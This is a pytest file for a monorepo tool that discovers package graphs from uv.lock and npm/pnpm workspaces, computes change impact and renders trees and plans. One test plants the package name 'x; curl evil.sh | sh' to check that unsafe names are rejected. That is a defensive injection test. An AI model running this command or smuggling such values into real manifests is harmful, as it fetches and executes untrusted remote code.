"""Graph discovery from ecosystem manifests, impact chains, rendering."""

import json
import tomllib
from pathlib import Path

import pytest

from picard import config as cfgmod
from picard import graph
from picard.planner import build_plan

pytestmark = [pytest.mark.unit, pytest.mark.baseline]

TEMPLATE = Path(__file__).parent.parent / "src" / "picard" / "templates" / "pipeline.toml"

UV_LOCK = """\
version = 1
requires-python = ">=3.11"

[manifest]
members = ["component-abc", "component-def", "some-api", "demo"]

[[package]]
name = "component-abc"
version = "0.1.0"
source = { editable = "packages/component-abc" }

[[package]]
name = "component-def"
version = "0.1.0"
source = { editable = "packages/component-def" }
dependencies = [{ name = "component-abc" }]

[[package]]
name = "some-api"
version = "0.1.0"
source = { editable = "apps/some-api" }
dependencies = [{ name = "component-def" }, { name = "requests" }]

[[package]]
name = "demo"
version = "0.0.0"
source = { virtual = "." }

[[package]]
name = "requests"
version = "2.0.0"
source = { registry = "https://pypi.org/simple" }

[[package]]
name = "outside"
version = "1.0.0"
source = { editable = "../elsewhere" }
"""


def write(root: Path, rel: str, text: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def pkg_json(name: str, **deps: str) -> str:
    return json.dumps({"name": name, "version": "1.0.0", "dependencies": deps})


# ── uv ─────────────────────────────────────────────────────────────────────────────────


def test_uv_discovers_workspace_members_and_their_edges(tmp_path):
    write(tmp_path, "uv.lock", UV_LOCK)
    found = {d.name: d for d in graph.discover("uv", tmp_path)}
    assert set(found) == {
        "component-abc",
        "component-def",
        "some-api",
    }  # no root, no registry, no outside
    assert found["some-api"].depends_on == ("component-def",)  # requests is external
    assert found["component-def"].depends_on == ("component-abc",)
    assert found["component-abc"].depends_on == ()
    assert found["some-api"].path == "apps/some-api"


def test_uv_counts_dev_and_optional_dependencies_as_edges(tmp_path):
    write(
        tmp_path,
        "uv.lock",
        """\
[manifest]
members = ["a", "b", "c"]

[[package]]
name = "a"
source = { editable = "a" }
[package.dev-dependencies]
dev = [{ name = "b" }]
[package.optional-dependencies]
extra = [{ name = "c" }]

[[package]]
name = "b"
source = { editable = "b" }

[[package]]
name = "c"
source = { editable = "c" }
""",
    )
    found = {d.name: d for d in graph.discover("uv", tmp_path)}
    assert found["a"].depends_on == ("b", "c")


def test_uv_without_a_lockfile_says_how_to_fix_it(tmp_path):
    with pytest.raises(graph.DiscoveryError, match="uv lock"):
        graph.discover("uv", tmp_path)


# ── npm / pnpm ─────────────────────────────────────────────────────────────────────────


def js_workspace(root: Path, *, pnpm: bool) -> None:
    if pnpm:
        write(
            root,
            "pnpm-workspace.yaml",
            "packages:\n  - 'apps/*'\n  - \"packages/*\"  # shared\n  - '!**/dist'\n",
        )
        write(root, "package.json", json.dumps({"name": "root", "private": True}))
    else:
        write(
            root,
            "package.json",
            json.dumps({"name": "root", "workspaces": ["apps/*", "packages/*"]}),
        )
    write(root, "packages/ui-kit/package.json", pkg_json("@demo/ui-kit"))
    write(
        root,
        "apps/admin/package.json",
        pkg_json("@demo/admin", **{"@demo/ui-kit": "workspace:*", "left-pad": "1.0.0"}),
    )
    write(root, "apps/landing/package.json", pkg_json("@demo/landing", **{"@demo/ui-kit": "*"}))
    write(root, "apps/node_modules/junk/package.json", pkg_json("junk"))


@pytest.mark.parametrize(
    "pnpm", [True, False], ids=["pnpm-workspace.yaml", "package.json workspaces"]
)
def test_npm_discovers_members_and_workspace_edges(tmp_path, pnpm):
    js_workspace(tmp_path, pnpm=pnpm)
    found = {d.name: d for d in graph.discover("npm", tmp_path)}
    assert set(found) == {"@demo/ui-kit", "@demo/admin", "@demo/landing"}
    assert found["@demo/admin"].depends_on == ("@demo/ui-kit",)  # left-pad is external
    assert found["@demo/landing"].depends_on == ("@demo/ui-kit",)
    assert found["@demo/ui-kit"].path == "packages/ui-kit"


def test_npm_without_workspaces_is_an_error(tmp_path):
    write(tmp_path, "package.json", json.dumps({"name": "solo"}))
    with pytest.raises(graph.DiscoveryError, match="no workspaces"):
        graph.discover("npm", tmp_path)


def test_unsafe_package_names_are_rejected(tmp_path):
    write(tmp_path, "package.json", json.dumps({"workspaces": ["p/*"]}))
    write(tmp_path, "p/evil/package.json", pkg_json("x; curl evil.sh | sh"))
    with pytest.raises(graph.DiscoveryError, match="unsafe package name"):
        graph.discover("npm", tmp_path)


def test_unknown_provider(tmp_path):
    with pytest.raises(graph.DiscoveryError, match="unknown graph provider"):
        graph.discover("bazel", tmp_path)


# ── config integration: discovery + explicit overrides ─────────────────────────────────


def monorepo_config(tmp_path, extra: str = "") -> cfgmod.Config:
    write(tmp_path, "uv.lock", UV_LOCK)
    js_workspace(tmp_path, pnpm=True)
    raw = tomllib.loads(TEMPLATE.read_text(encoding="utf-8"))
    raw["packages"] = []
    raw["discover"] = [
        {
            "provider": "uv",
            "commands": {"test": 'pytest {path} -m "{markers}"', "lint": "ruff check {path}"},
        },
        {"provider": "npm", "commands": {"test": "pnpm --filter {package} test"}},
    ]
    raw.update(tomllib.loads(extra))
    return cfgmod.parse(raw, root=tmp_path)


def test_config_merges_both_ecosystems(tmp_path):
    cfg = monorepo_config(tmp_path)
    assert set(cfg.packages) == {
        "component-abc",
        "component-def",
        "some-api",
        "@demo/ui-kit",
        "@demo/admin",
        "@demo/landing",
    }
    assert cfg.packages["some-api"].provider == "uv"
    assert cfg.packages["@demo/admin"].provider == "npm"
    assert cfg.packages["@demo/admin"].commands == {"test": "pnpm --filter {package} test"}


def test_explicit_package_entries_override_and_extend_discovered_ones(tmp_path):
    cfg = monorepo_config(
        tmp_path,
        """
[[packages]]
name = "some-api"
baseline = true
depends_on = ["@demo/ui-kit"]
[packages.commands]
"test@pr-baseline" = "pytest apps/some-api -m baseline"
""",
    )
    api = cfg.packages["some-api"]
    assert api.baseline is True
    assert api.depends_on == ("component-def", "@demo/ui-kit")  # discovered + manual edge
    assert api.commands["lint"] == "ruff check {path}"  # still inherited
    assert api.commands["test@pr-baseline"] == "pytest apps/some-api -m baseline"


def test_a_name_found_by_two_providers_is_an_error(tmp_path):
    write(tmp_path, "uv.lock", UV_LOCK)
    write(tmp_path, "package.json", json.dumps({"workspaces": ["x/*"]}))
    write(tmp_path, "x/a/package.json", pkg_json("component-abc"))
    raw = tomllib.loads(TEMPLATE.read_text(encoding="utf-8"))
    raw["packages"] = []
    raw["discover"] = [{"provider": "uv"}, {"provider": "npm"}]
    with pytest.raises(cfgmod.ConfigError, match="more than one provider"):
        cfgmod.parse(raw, root=tmp_path)


def test_discover_needs_a_root():
    raw = tomllib.loads(TEMPLATE.read_text(encoding="utf-8"))
    raw["discover"] = [{"provider": "uv"}]
    with pytest.raises(cfgmod.ConfigError, match="repository root"):
        cfgmod.parse(raw)


# ── impact: follow the graph ───────────────────────────────────────────────────────────


@pytest.fixture
def cfg(tmp_path):
    return monorepo_config(tmp_path)


def test_a_change_in_the_bottom_package_reaches_every_dependent(cfg):
    impact = graph.compute_impact(cfg, ["packages/component-abc/src/component_abc/encoder.py"])
    assert impact.changed == ("component-abc",)
    assert list(impact.affected) == ["component-abc", "component-def", "some-api"]
    assert impact.chain("some-api") == "some-api -> component-def -> component-abc"
    assert not impact.everything


def test_a_change_in_the_middle_does_not_touch_the_bottom(cfg):
    impact = graph.compute_impact(cfg, ["packages/component-def/src/x.py"])
    assert list(impact.affected) == ["component-def", "some-api"]


def test_a_change_in_an_app_affects_only_the_app(cfg):
    assert list(graph.compute_impact(cfg, ["apps/some-api/app.py"]).affected) == ["some-api"]


def test_the_two_ecosystems_are_independent_subgraphs(cfg):
    impact = graph.compute_impact(cfg, ["packages/ui-kit/index.js"])
    assert set(impact.affected) == {"@demo/ui-kit", "@demo/admin", "@demo/landing"}
    assert "some-api" not in impact.affected


def test_a_global_file_affects_everything(tmp_path):
    cfg = monorepo_config(tmp_path, '[paths]\nglobal = ["uv.lock"]\n')
    impact = graph.compute_impact(cfg, ["uv.lock"])
    assert impact.everything and len(impact.affected) == 6
    assert "global file" in graph.render_why(impact)[0]


def test_files_outside_every_package_affect_nothing(cfg):
    assert graph.compute_impact(cfg, ["README.md"]).affected == {}


# ── rendering ──────────────────────────────────────────────────────────────────────────


def test_tree_marks_changed_affected_and_untouched(cfg):
    impact = graph.compute_impact(cfg, ["packages/component-abc/x.py"])
    text = graph.render_tree(cfg, impact)
    assert "◐ some-api" in text and "● component-abc" in text and "○ @demo/admin" in text
    assert "└─ ◐ component-def" in text  # indentation = depends on
    assert "changed" in text.splitlines()[-1]


def test_tree_without_an_impact_shows_everything_untouched(cfg):
    tree = graph.render_tree(cfg).split("\n\n")[0]  # the legend below it names the symbols
    assert "●" not in tree and "◐" not in tree


def test_color_adds_ansi_only_when_asked(cfg):
    impact = graph.compute_impact(cfg, ["packages/component-abc/x.py"])
    assert "\033[" not in graph.render_tree(cfg, impact)
    assert "\033[" in graph.render_tree(cfg, impact, color=True)


def test_mermaid_has_nodes_edges_and_state_classes(cfg):
    impact = graph.compute_impact(cfg, ["packages/component-abc/x.py"])
    mermaid = graph.render_mermaid(cfg, impact)
    assert mermaid.startswith("flowchart TD")
    assert mermaid.count("-->") == 4  # api->def, def->abc, admin->ui-kit, landing->ui-kit
    assert "class " in mermaid and "classDef changed" in mermaid


def test_split_files_handles_commas_dots_and_duplicates():
    assert graph.split_files(["./a.py,b.py", "a.py", " c.py "]) == ["a.py", "b.py", "c.py"]


# ── the plan follows the graph ─────────────────────────────────────────────────────────


def test_plan_runs_the_whole_chain_and_explains_why(cfg):
    plan = build_plan(
        cfg,
        1,
        titles=["fix(component-abc): encode empty input (ABC-1)"],
        changed_files=["packages/component-abc/src/component_abc/encoder.py"],
    )
    assert plan["packages"] == ["component-abc", "component-def", "some-api"]
    assert any(
        "some-api is affected through some-api -> component-def -> component-abc" in w
        for w in plan["impact"]["why"]
    )


def test_command_override_per_tier_and_empty_skips(tmp_path):
    cfg = monorepo_config(
        tmp_path,
        """
[[packages]]
name = "@demo/admin"
[packages.commands]
"test@pr-baseline" = "pnpm --filter {package} run test:baseline"
[[packages]]
name = "@demo/landing"
[packages.commands]
"test@pr-baseline" = ""
""",
    )
    files = ["packages/ui-kit/index.js"]
    fast = build_plan(cfg, 1, titles=["fix: x (ABC-1)"], changed_files=files)
    base = build_plan(cfg, 2, titles=["fix: x (ABC-1)"], changed_files=files)
    assert {s["package"]: s["command"] for s in fast["suites"]}[
        "@demo/admin"
    ] == "pnpm --filter @demo/admin test"
    base_commands = {s["package"]: s["command"] for s in base["suites"]}
    assert base_commands["@demo/admin"] == "pnpm --filter @demo/admin run test:baseline"
    assert "@demo/landing" not in base_commands  # empty value = skip at this tier
